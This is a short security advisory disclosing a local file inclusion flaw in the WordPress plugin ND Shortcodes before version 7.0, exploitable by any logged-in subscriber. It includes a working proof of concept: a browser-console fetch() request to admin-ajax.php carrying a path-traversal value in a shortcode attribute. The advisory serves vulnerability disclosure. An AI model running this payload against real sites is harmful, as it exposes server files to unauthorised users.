## WordPress Plugin Vulnerabilities

# ND Shortcodes < 7.0 - Subscriber+ LFI

### Description

The plugin does not validate some shortcode attributes before using them to generate paths passed to include function/s, allowing any authenticated users such as subscriber to perform LFI attacks

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a subscriber user, this will include the index.php file of the root of the blog
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[nd\_options\_testimonial nd\_options\_layout='../../../../../../index']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
Numerous shortcodes were affected by this
